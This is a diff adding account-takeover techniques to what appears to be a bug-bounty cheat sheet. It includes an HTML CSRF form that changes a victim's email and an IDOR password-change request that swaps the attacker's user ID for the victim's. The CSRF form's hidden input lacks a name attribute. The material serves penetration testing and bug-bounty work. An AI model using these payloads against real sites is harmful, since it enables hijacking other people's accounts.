@@ -18,3 +18,32 @@ POST /newaccount
 [...]
 email=victim@mail.com&password=hacked
 ```
+Source: [Link](https://medium.com/bugbountywriteup/account-takeover-via-csrf-78add8c99526)
+
+3. via CSRF
+   - Create an account as an attacker and fill all the form, check your info in the Account Detail.
+   - Change the email and capture the request, then created a CSRF Exploit.
+   - The CSRF Exploit looks like as given below. I have replaced the email value to anyemail@*******.com and submitted a request in the victim’s account.
+
+```html
+<html>
+<body>
+   <form action="https://evil.com/user/change-email" method="POST">
+      <input type="hidden" value="victim@gmail.com"/>
+      <input type="submit" value="Submit Request">
+   </form>
+</body>
+</html>
+```
+Source: [Link](https://medium.com/bugbountywriteup/account-takeover-via-csrf-78add8c99526)
+
+4. Chaining with IDOR, for example
+```
+POST /changepassword.php
+Host: site.com
+[...]
+userid=500&password=heked123
+```
+500 is an attacker ID and 501 is a victim ID, so we change the userid from attacker to victim ID
+
+5. No Rate Limit on 2FA
